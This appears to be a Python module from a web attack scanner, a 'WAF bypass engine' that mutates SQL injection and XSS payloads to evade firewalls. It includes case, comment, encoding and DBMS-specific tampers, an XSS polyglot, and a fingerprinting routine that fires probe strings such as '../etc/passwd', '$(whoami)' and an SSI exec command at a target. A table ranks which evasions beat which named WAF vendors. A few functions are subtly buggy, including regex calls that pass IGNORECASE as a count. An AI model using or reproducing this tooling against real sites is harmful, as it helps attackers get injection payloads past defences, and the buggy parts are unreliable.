"""
WAF bypass engine: tamper sets, fingerprinting, and mutation dispatch.

Three concerns, cleanly separated:

  1. TAMPERS — named str->str functions that transform a payload.
     SQL_TAMPERS and XSS_TAMPERS are dicts of {name: (category, fn)}.

  2. FINGERPRINTING — send a benign request containing WAF-trigger
     characters and detect which WAF (if any) responds differently
     from baseline. Returns a fingerprint string.

  3. APPLICATION — apply one tamper, apply a chain of tampers,
     enumerate sequences. The application layer is what sqli.py
     and xss.py call into.

Why tampers are pure functions: they can be tested in isolation,
composed freely, and cached. Everything the caller needs to know
about a tamper is its name and its category.
"""

import re
import urllib.parse


# =====================================================================
# SQL TAMPERS
# =====================================================================

_SQL_KEYWORDS_RE = re.compile(
    r"\b(select|union|and|or|from|where|order|by|group|having|limit|"
    r"offset|sleep|waitfor|delay|extractvalue|updatexml|convert|cast|"
    r"concat|substring|substr|ascii|char|information_schema|version|"
    r"benchmark|load_file|into|outfile|dumpfile)\b",
    re.IGNORECASE,
)


# --- Case ---

def _sql_case_upper(p):    return _SQL_KEYWORDS_RE.sub(
    lambda m: m.group(0).upper(), p)

def _sql_case_lower(p):    return _SQL_KEYWORDS_RE.sub(
    lambda m: m.group(0).lower(), p)

def _sql_case_alternate(p):
    def alt(m):
        return "".join(c.upper() if i % 2 == 0 else c.lower()
                       for i, c in enumerate(m.group(0)))
    return _SQL_KEYWORDS_RE.sub(alt, p)

def _sql_case_random(p):
    import random
    def alt(m):
        return "".join(c.upper() if random.random() < 0.5 else c.lower()
                       for c in m.group(0))
    return _SQL_KEYWORDS_RE.sub(alt, p)


# --- Whitespace ---

def _sql_space_to_tab(p):     return p.replace(" ", "\t")
def _sql_space_to_newline(p): return p.replace(" ", "\n")
def _sql_space_to_cr(p):      return p.replace(" ", "\r")
def _sql_space_to_comment(p):
    return re.sub(r"(?<=[\w'\"])\s+(?=[\w'\"])", "/**/", p)
def _sql_space_to_plus(p):    return p.replace(" ", "+")
def _sql_space_to_0a(p):      return p.replace(" ", "%0a")
def _sql_space_to_09(p):      return p.replace(" ", "%09")


# --- Comments ---

def _sql_comment_split_keywords(p):
    def split(m):
        w = m.group(0)
        if len(w) < 3:
            return w
        mid = len(w) // 2
        return w[:mid] + "/**/" + w[mid:]
    return _SQL_KEYWORDS_RE.sub(split, p)

def _sql_inline_comment_between(p):
    return re.sub(r"(\w)\s+(\w)", r"\1/**/\2", p)


# --- Keyword substitution ---

def _sql_and_to_amp(p):   return re.sub(r"\bAND\b", "&&", p, re.IGNORECASE)
def _sql_or_to_pipes(p):  return re.sub(r"\bOR\b",  "||", p, re.IGNORECASE)
def _sql_eq_to_like(p):   return re.sub(r"\s*=\s*", " LIKE ", p)
def _sql_eq_to_regexp(p): return re.sub(r"\s*=\s*", " REGEXP ", p)
def _sql_gt_to_not_lt(p):
    return re.sub(r"(\w+)\s*>\s*(\w+)", r"NOT (\1 <= \2)", p)
def _sql_space_repl(p):   return p.replace(" ", "/**/")
def _sql_concat_to_pipes(p):
    return re.sub(r"\bCONCAT\s*\(", "(", p, re.IGNORECASE)


# --- Quote replacement ---

def _sql_quote_to_char(p):  return p.replace("'", "CHAR(39)")
def _sql_quote_to_hex(p):   return p.replace("'", "0x27")
def _sql_quote_to_unhex(p): return p.replace("'", "UNHEX('27')")
def _sql_dquote_to_char(p): return p.replace('"', "CHAR(34)")


# --- Encoding ---

_UNRESERVED = set(
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~"
)

def _sql_url_encode(p):
    return "".join(ch if ch in _UNRESERVED else urllib.parse.quote(ch, safe="")
                   for ch in p)

def _sql_double_url_encode(p):
    return urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")

def _sql_partial_url_encode(p):
    # Encode only the SQL-significant characters
    significant = set("'\"()=<>!# %")
    out = []
    for ch in p:
        if ch in significant:
            out.append(urllib.parse.quote(ch, safe=""))
        else:
            out.append(ch)
    return "".join(out)


# --- MySQL-specific ---

def _sql_mysql_version_comment(p):
    return f"/*!50000{p}*/"

def _sql_mysql_gtid_subset(p):
    return f"AND GTID_SUBSET({p},1)"

def _sql_mysql_extractvalue(p):
    return f"AND extractvalue(1,concat(0x7e,({p})))"

def _sql_mysql_procedure_analyse(p):
    return f"PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,({p}))),1)"


# --- MSSQL-specific ---

def _sql_mssql_convert(p):
    return f"AND 1=CONVERT(int,({p}))"

def _sql_mssql_char_to_plus(p):
    return re.sub(r"\bCHAR\s*\(\s*(\d+)\s*\)", r"CHAR(\1)+''", p)

def _sql_mssql_bracket(p):
    return p.replace("[", "[[]")


# --- Postgres-specific ---

def _sql_pg_chr_to_concat(p):
    return re.sub(r"\bCHR\s*\((\d+)\)", r"CHR(\1)::text", p)

def _sql_pg_sleep_to_pg_sleep(p):
    return re.sub(r"\bsleep\s*\(", "pg_sleep(", p, re.IGNORECASE)


# --- Oracle-specific ---

def _sql_oracle_dual(p):
    return re.sub(r"\bFROM\s+DUAL\b", "FROM DUAL", p, re.IGNORECASE)

def _sql_oracle_utl_inaddr(p):
    return f"AND 1=UTL_INADDR.GET_HOST_ADDRESS(({p}))"


# --- SQLite-specific ---

def _sql_sqlite_randomblob(p):
    return f"AND 1=randomblob(0)"

def _sql_sqlite_gsub(p):
    return p.replace("substring(", "substr(").replace(
        "SUBSTRING(", "SUBSTR(")


# --- Tamper registry ---

SQL_TAMPERS = {
    # Case
    "case_upper":            ("case",     _sql_case_upper),
    "case_lower":            ("case",     _sql_case_lower),
    "case_alternate":        ("case",     _sql_case_alternate),
    "case_random":           ("case",     _sql_case_random),

    # Whitespace
    "space_to_tab":          ("space",    _sql_space_to_tab),
    "space_to_newline":      ("space",    _sql_space_to_newline),
    "space_to_cr":           ("space",    _sql_space_to_cr),
    "space_to_comment":      ("space",    _sql_space_to_comment),
    "space_to_plus":         ("space",    _sql_space_to_plus),
    "space_to_0a":           ("space",    _sql_space_to_0a),
    "space_to_09":           ("space",    _sql_space_to_09),

    # Comments
    "comment_split":         ("comment",  _sql_comment_split_keywords),
    "comment_between":       ("comment",  _sql_inline_comment_between),

    # Keywords
    "and_to_amp":            ("keyword",  _sql_and_to_amp),
    "or_to_pipes":           ("keyword",  _sql_or_to_pipes),
    "eq_to_like":            ("keyword",  _sql_eq_to_like),
    "eq_to_regexp":          ("keyword",  _sql_eq_to_regexp),
    "gt_to_not_lt":          ("keyword",  _sql_gt_to_not_lt),
    "keyword_space_repl":    ("keyword",  _sql_space_repl),
    "concat_to_pipes":       ("keyword",  _sql_concat_to_pipes),

    # Quotes
    "quote_to_char":         ("quote",    _sql_quote_to_char),
    "quote_to_hex":          ("quote",    _sql_quote_to_hex),
    "quote_to_unhex":        ("quote",    _sql_quote_to_unhex),
    "dquote_to_char":        ("quote",    _sql_dquote_to_char),

    # Encoding
    "url_encode":            ("encoding", _sql_url_encode),
    "double_url_encode":     ("encoding", _sql_double_url_encode),
    "partial_url_encode":    ("encoding", _sql_partial_url_encode),

    # MySQL
    "mysql_version_comment": ("mysql",    _sql_mysql_version_comment),
    "mysql_gtid_subset":     ("mysql",    _sql_mysql_gtid_subset),
    "mysql_extractvalue":    ("mysql",    _sql_mysql_extractvalue),
    "mysql_procedure":       ("mysql",    _sql_mysql_procedure_analyse),

    # MSSQL
    "mssql_convert":         ("mssql",    _sql_mssql_convert),
    "mssql_char_to_plus":    ("mssql",    _sql_mssql_char_to_plus),
    "mssql_bracket":         ("mssql",    _sql_mssql_bracket),

    # Postgres
    "pg_chr_to_concat":      ("postgres", _sql_pg_chr_to_concat),
    "pg_sleep_rename":       ("postgres", _sql_pg_sleep_to_pg_sleep),

    # Oracle
    "oracle_dual":           ("oracle",   _sql_oracle_dual),
    "oracle_utl_inaddr":     ("oracle",   _sql_oracle_utl_inaddr),

    # SQLite
    "sqlite_randomblob":     ("sqlite",   _sql_sqlite_randomblob),
    "sqlite_gsub":           ("sqlite",   _sql_sqlite_gsub),
}


# =====================================================================
# XSS TAMPERS
# =====================================================================

_HTML_TAG_RE = re.compile(r"<(/?)([a-zA-Z][a-zA-Z0-9]*)")
_JS_KEYWORD_RE = re.compile(
    r"\b(alert|confirm|prompt|eval|script|onerror|onload|onfocus|"
    r"onmouseover|javascript|document|window|location|cookie|"
    r"svg|img|iframe|body|style)\b",
    re.IGNORECASE,
)


# --- Tag case ---

def _xss_tag_upper(p):
    return _HTML_TAG_RE.sub(lambda m: "<" + m.group(1) + m.group(2).upper(), p)

def _xss_tag_lower(p):
    return _HTML_TAG_RE.sub(lambda m: "<" + m.group(1) + m.group(2).lower(), p)

def _xss_tag_alternate(p):
    def alt(m):
        name = m.group(2)
        mixed = "".join(c.upper() if i % 2 == 0 else c.lower()
                        for i, c in enumerate(name))
        return "<" + m.group(1) + mixed
    return _HTML_TAG_RE.sub(alt, p)


# --- Keyword case ---

def _xss_keyword_upper(p):
    return _JS_KEYWORD_RE.sub(lambda m: m.group(0).upper(), p)

def _xss_keyword_lower(p):
    return _JS_KEYWORD_RE.sub(lambda m: m.group(0).lower(), p)

def _xss_keyword_alternate(p):
    def alt(m):
        return "".join(c.upper() if i % 2 == 0 else c.lower()
                       for i, c in enumerate(m.group(0)))
    return _JS_KEYWORD_RE.sub(alt, p)


# --- Attribute split ---

def _xss_space_to_slash(p):
    return re.sub(r"<(\w+)\s+", r"<\1/", p)

def _xss_space_to_tab(p):
    return p.replace(" ", "\t")

def _xss_space_to_newline(p):
    return p.replace(" ", "\n")

def _xss_attr_null(p):
    # Insert %00 between attribute and event handler
    return re.sub(r"\s+(on\w+=)", r"%00\1", p, flags=re.IGNORECASE)


# --- Quote breakout ---

def _xss_breakout_double(p):
    # Convert single-quote breakout to double-quote breakout
    if p.startswith("'>"):
        return "\">" + p[2:]
    return p

def _xss_breakout_single(p):
    if p.startswith("\">"):
        return "'>" + p[2:]
    return p

def _xss_breakout_both(p):
    # Try both quote styles via backtick
    if p.startswith("'>"):
        return "`>" + p[2:]
    return p

def _xss_add_closing(p):
    # Ensure the payload closes the enclosing attribute
    if not p.startswith(("'", '"')):
        return "\">" + p
    return p

def _xss_autofocus(p):
    # Rewrite to use autofocus+onfocus, which avoids "click" requirements
    return re.sub(r"onerror\s*=", "autofocus onfocus=", p, flags=re.IGNORECASE)


# --- Event handler swap ---

def _xss_onerror_to_onload(p):
    return re.sub(r"onerror\s*=", "onload=", p, flags=re.IGNORECASE)

def _xss_onerror_to_onfocus(p):
    return re.sub(r"onerror\s*=", "onfocus=", p, flags=re.IGNORECASE)

def _xss_onerror_to_onmouseover(p):
    return re.sub(r"onerror\s*=", "onmouseover=", p, flags=re.IGNORECASE)

def _xss_img_to_svg(p):
    return re.sub(
        r"<img\s+src\s*=\s*x\s+onerror\s*=\s*(alert\s*\([^)]*\))\s*/?>",
        r"<svg onload=\1>", p, flags=re.IGNORECASE)

def _xss_script_to_img(p):
    return re.sub(
        r"<script\s*>\s*(alert\s*\([^)]*\))\s*</script\s*>",
        r"<img src=x onerror=\1>", p, flags=re.IGNORECASE)


# --- Protocol swap ---

def _xss_javascript_case(p):
    return re.sub(r"javascript\s*:", "JaVaScRiPt:", p, flags=re.IGNORECASE)

def _xss_data_url(p):
    import base64
    m = re.search(r"alert\s*\(\s*([^)]*)\s*\)", p)
    if not m:
        return p
    arg = m.group(1)
    payload = f"<script>alert({arg})</script>"
    b64 = base64.b64encode(payload.encode()).decode()
    return f"data:text/html;base64,{b64}"


# --- Unicode / encoding ---

def _xss_html_entity_decimal(p):
    return "".join(f"&#{ord(c)};" for c in p)

def _xss_html_entity_hex(p):
    return "".join(f"&#x{ord(c):x};" for c in p)

def _xss_html_entity_padded(p):
    return "".join(f"&#{ord(c):04d};" for c in p)

def _xss_unicode_escape(p):
    return "".join(f"\\u{ord(c):04x}" for c in p)

def _xss_url_encode(p):
    return urllib.parse.quote(p, safe="")

def _xss_double_url(p):
    return urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")


# --- Whitespace in payload ---

def _xss_no_space(p):
    return re.sub(r"\s+", "", p)

def _xss_tab_between_attrs(p):
    return re.sub(r"\s+", "\t", p)

def _xss_newline_between_attrs(p):
    return re.sub(r"\s+", "\n", p)

def _xss_slash_between(p):
    return re.sub(r"\s+", "/", p)


# --- Polyglot ---

def _xss_polyglot(p):
    if "<script>" in p.lower():
        return ("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )"
                "//%%0D%0A%0d%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>"
                "\\x3csVg/<sVg/oNloAd=alert()//>\\x3e")
    return p

def _xss_tag_mash(p):
    return (p.replace("<script>", "<scr<script>ipt>")
             .replace("</script>", "</scr</script>ipt>")
             .replace("<svg", "<sv<script>g")
             .replace("<img", "<i<script>mg"))


# --- DOM sinks ---

def _xss_dom_breakout(p):
    # For payloads being injected into a JS string context
    return "'-alert(1)-'"

def _xss_dom_backtick(p):
    return "`-alert(1)-`"


# --- Tamper registry ---

XSS_TAMPERS = {
    # Tag case
    "tag_upper":             ("case",      _xss_tag_upper),
    "tag_lower":             ("case",      _xss_tag_lower),
    "tag_alternate":         ("case",      _xss_tag_alternate),

    # Keyword case
    "kw_upper":              ("case",      _xss_keyword_upper),
    "kw_lower":              ("case",      _xss_keyword_lower),
    "kw_alternate":          ("case",      _xss_keyword_alternate),

    # Attribute splits
    "space_to_slash":        ("split",     _xss_space_to_slash),
    "space_to_tab":          ("split",     _xss_space_to_tab),
    "space_to_newline":      ("split",     _xss_space_to_newline),
    "attr_null":             ("split",     _xss_attr_null),

    # Quote breakout
    "breakout_double":       ("breakout",  _xss_breakout_double),
    "breakout_single":       ("breakout",  _xss_breakout_single),
    "breakout_backtick":     ("breakout",  _xss_breakout_both),
    "add_closing_quote":     ("breakout",  _xss_add_closing),
    "autofocus_swap":        ("breakout",  _xss_autofocus),

    # Event swap
    "onerror_to_onload":     ("event",     _xss_onerror_to_onload),
    "onerror_to_onfocus":    ("event",     _xss_onerror_to_onfocus),
    "onerror_to_onmouseover":("event",     _xss_onerror_to_onmouseover),
    "img_to_svg":            ("event",     _xss_img_to_svg),
    "script_to_img":         ("event",     _xss_script_to_img),

    # Protocol
    "js_case_swap":          ("protocol",  _xss_javascript_case),
    "data_url":              ("protocol",  _xss_data_url),

    # Encoding
    "html_entity_dec":       ("encoding",  _xss_html_entity_decimal),
    "html_entity_hex":       ("encoding",  _xss_html_entity_hex),
    "html_entity_padded":    ("encoding",  _xss_html_entity_padded),
    "unicode_escape":        ("encoding",  _xss_unicode_escape),
    "url_encode":            ("encoding",  _xss_url_encode),
    "double_url":            ("encoding",  _xss_double_url),

    # Whitespace
    "no_space":              ("space",     _xss_no_space),
    "tab_between":           ("space",     _xss_tab_between_attrs),
    "newline_between":       ("space",     _xss_newline_between_attrs),
    "slash_between":         ("space",     _xss_slash_between),

    # Polyglot
    "polyglot":              ("polyglot",  _xss_polyglot),
    "tag_mash":              ("polyglot",  _xss_tag_mash),

    # DOM
    "dom_breakout":          ("dom",       _xss_dom_breakout),
    "dom_backtick":          ("dom",       _xss_dom_backtick),
}


# =====================================================================
# Tamper categories (for introspection)
# =====================================================================

TAMPER_CATEGORIES = {
    "sql": {
        "case", "space", "comment", "keyword", "quote", "encoding",
        "mysql", "mssql", "postgres", "oracle", "sqlite",
    },
    "xss": {
        "case", "split", "breakout", "event", "protocol",
        "encoding", "space", "polyglot", "dom",
    },
}


# =====================================================================
# WAF fingerprinting
# =====================================================================

# WAF-specific signatures to look for in a blocked response
WAF_FINGERPRINTS = {
    "cloudflare": [
        "cloudflare", "cf-ray", "cf-mitigated", "__cfduid",
        "attention required", "ray id:",
    ],
    "modsecurity": [
        "mod_security", "modsecurity", "owasp_crs", "owasp crs",
        "not acceptable", "406 not acceptable",
        "the requested url was rejected",
    ],
    "aws-waf": [
        "aws waf", "awswaf", "x-amzn-requestid",
        "request blocked",
    ],
    "akamai": [
        "akamai", "reference #", "akamai ghost",
    ],
    "imperva": [
        "imperva", "incapsula", "incident id",
    ],
    "f5": [
        "f5 networks", "big-ip", "tscookie",
    ],
    "sucuri": [
        "sucuri cloudproxy", "cloudproxy", "sucuri.net",
    ],
    "wordfence": [
        "wordfence", "generated by wordfence",
    ],
    "barracuda": [
        "barracuda", "barra_counter_session",
    ],
    "fortiweb": [
        "fortiweb", "fortinet",
    ],
    "wallarm": [
        "wallarm", "nginx-wallarm",
    ],
}


# Characters/tokens most likely to trigger a WAF
_WAF_PROBE_TOKENS = [
    "'",
    "<script>alert(1)</script>",
    "' OR '1'='1",
    "../etc/passwd",
    "$(whoami)",
    "<!--#exec cmd=\"id\"-->",
]


async def fingerprint_waf(session, url, limiter, cookies=None,
                          timeout=10.0, verbose=False):
    """Detect which WAF (if any) is present on a target.

    Sends a small set of WAF-trigger tokens as query parameters and
    compares responses against a clean baseline. Returns a dict:

        {
          "detected": "cloudflare" | "modsecurity" | ... | "unknown" | "none",
          "signatures": [str],   # matched signature strings
          "trigger_token": str,  # which token produced the detection
          "blocked_status": int, # HTTP status of the blocked response
        }
    """
    from core.http import fetch
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

    parsed = urlparse(url)
    base_params = parse_qs(parsed.query, keep_blank_values=True)
    param_name = next(iter(base_params.keys()), "q")

    # Step 1: baseline request with a benign value
    try:
        status, _h, body, _ = await fetch(
            session, url, limiter, timeout=timeout, cookies=cookies,
            quiet=True)
    except Exception:
        return {"detected": "none", "signatures": [],
                "trigger_token": "", "blocked_status": None}
    if status is None:
        return {"detected": "none", "signatures": [],
                "trigger_token": "", "blocked_status": None}

    baseline_status = status
    baseline_len = len(body or "")

    # Step 2: send each trigger token
    for token in _WAF_PROBE_TOKENS:
        test_params = dict(base_params)
        test_params[param_name] = [token]
        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(test_params, doseq=True),
            parsed.fragment))

        try:
            status, _h, body, _ = await fetch(
                session, test_url, limiter, timeout=timeout,
                cookies=cookies, quiet=True)
        except Exception:
            continue
        if status is None:
            continue

        body = body or ""

        # Check for a block: status change or body change with a signature
        status_changed = status != baseline_status
        body_changed = abs(len(body) - baseline_len) > 50

        if not (status_changed or body_changed):
            continue

        low = body.lower()

        # Match against WAF signatures
        for waf_name, sigs in WAF_FINGERPRINTS.items():
            matched = [s for s in sigs if s.lower() in low]
            if matched:
                if verbose:
                    from core.output import success as _s
                    _s(f"WAF fingerprint: {waf_name} "
                       f"(matched {matched!r} on token {token!r})")
                return {
                    "detected": waf_name,
                    "signatures": matched,
                    "trigger_token": token,
                    "blocked_status": status,
                }

        # Blocked, but no signature match
        if verbose:
            from core.output import warn as _w
            _w(f"WAF detected but not fingerprinted "
               f"(token {token!r}, status {status})")
        return {
            "detected": "unknown",
            "signatures": [],
            "trigger_token": token,
            "blocked_status": status,
        }

    # No blocks
    if verbose:
        from core.output import info as _i
        _i("WAF fingerprint: none detected")
    return {
        "detected": "none",
        "signatures": [],
        "trigger_token": "",
        "blocked_status": None,
    }


# =====================================================================
# Tamper selection
# =====================================================================

# For each WAF type, which tamper categories are most likely to work
_WAF_TAMPER_PRIORITY = {
    "cloudflare":    ["encoding", "case", "space", "comment"],
    "modsecurity":   ["comment", "space", "case", "encoding"],
    "aws-waf":       ["encoding", "case", "comment", "space"],
    "akamai":        ["case", "encoding", "space"],
    "imperva":       ["encoding", "comment", "case"],
    "f5":            ["case", "space", "encoding"],
    "sucuri":        ["comment", "case", "encoding"],
    "wordfence":     ["case", "comment", "encoding"],
    "barracuda":     ["encoding", "case"],
    "fortiweb":      ["comment", "case", "encoding"],
    "wallarm":       ["encoding", "comment", "case"],
    "unknown":       ["case", "space", "comment", "encoding"],
    "none":          [],  # no WAF, use plain payloads
}


def pick_tampers_for_fingerprint(fingerprint, protocol="sql"):
    """Return an ordered list of tamper names to try, given a fingerprint.

    `protocol` is "sql" or "xss".
    """
    table = SQL_TAMPERS if protocol == "sql" else XSS_TAMPERS

    detected = fingerprint.get("detected", "none") if fingerprint else "none"
    if detected == "none":
        # No WAF → still return identity + a couple of common ones,
        # in case a WAF is present but didn't trigger on our probe.
        return ["identity"]

    priority = _WAF_TAMPER_PRIORITY.get(
        detected, _WAF_TAMPER_PRIORITY["unknown"])

    # Build a list of tamper names, ordered by:
    #   1. category priority (matching the WAF's weaknesses)
    #   2. within a category, alphabetical (stable, reproducible)
    ordered = []
    for cat in priority:
        for name, (tcat, _fn) in sorted(table.items()):
            if tcat == cat and name not in ordered:
                ordered.append(name)

    # Append any remaining tampers (catch-all)
    for name in sorted(table.keys()):
        if name not in ordered:
            ordered.append(name)

    # Always start with identity so the plain payload is tried first
    return ["identity"] + ordered


# =====================================================================
# Application
# =====================================================================

def apply_single_tamper(payload, tamper_name, protocol="sql"):
    """Apply one named tamper to a payload. Returns the mutated string.

    If the tamper doesn't exist, returns the payload unchanged.
    """
    table = SQL_TAMPERS if protocol == "sql" else XSS_TAMPERS
    entry = table.get(tamper_name)
    if entry is None:
        return payload
    _cat, fn = entry
    try:
        return fn(payload)
    except Exception:
        return payload


def apply_tamper_chain(payload, chain, protocol="sql"):
    """Apply a sequence of tampers in order."""
    out = payload
    for name in chain:
        out = apply_single_tamper(out, name, protocol=protocol)
    return out


def enumerate_tamper_sequences(payload, tamper_names, depth=1,
                               max_sequences=200, protocol="sql"):
    """Yield (chain_names, mutated_payload) tuples.

    depth=1: single tampers only (sequential).
    depth=2: singles first, then pairs from the top-N (bounded cartesian).

    `max_sequences` caps the total yield to keep scans bounded.
    """
    seen = set()
    count = 0

    # depth 1: singles
    for name in tamper_names:
        if count >= max_sequences:
            return
        mutated = apply_single_tamper(payload, name, protocol=protocol)
        key = (name,)
        if key in seen:
            continue
        seen.add(key)
        count += 1
        yield (name,), mutated

    if depth < 2:
        return

    # depth 2: pairs from the first N tampers, minus identity
    candidates = [n for n in tamper_names if n != "identity"][:15]
    for i, a in enumerate(candidates):
        for b in candidates[i + 1:]:
            if count >= max_sequences:
                return
            mutated = apply_tamper_chain(
                payload, [a, b], protocol=protocol)
            key = (a, b)
            if key in seen:
                continue
            seen.add(key)
            count += 1
            yield key, mutated